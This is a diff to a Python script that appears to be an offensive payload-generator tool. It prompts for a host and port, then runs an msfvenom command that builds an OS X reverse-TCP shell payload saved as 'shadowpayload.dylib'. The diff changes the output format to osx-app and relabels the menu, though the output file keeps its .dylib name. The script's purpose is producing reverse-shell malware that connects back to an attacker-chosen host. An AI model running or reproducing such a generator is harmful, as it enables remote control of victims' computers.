@@ -3,8 +3,8 @@ import os, random
 def menu():
     banner()
     print("─╼┤ARCHITECTURE├───────────────────────────────────\n")
-    print("\t\t(1) macho (osx)")
-    print("\t\t(2) powershell (win)\n")
+    print("\t\t(1) osx-app")
+    print("\t\t(2) powershell\n")
     mode = input("─╼┤SELECTION├─> ")
     payloadGenerator(mode)
 
@@ -13,7 +13,7 @@ def payloadGenerator(mode):
 	    host = input("──────╼┤HOST├─> ")
 	    port = input("──────╼┤PORT├─> ")
 	    print("\n")
-	    command = "sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST="+host+" LPORT="+port+" -a x86 --platform osx -f macho -o shadowpayload.dylib"
+	    command = "sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST="+host+" LPORT="+port+" -a x86 --platform osx -f osx-app -o shadowpayload.dylib"
 	    os.system(command)
         
     elif mode == "2":
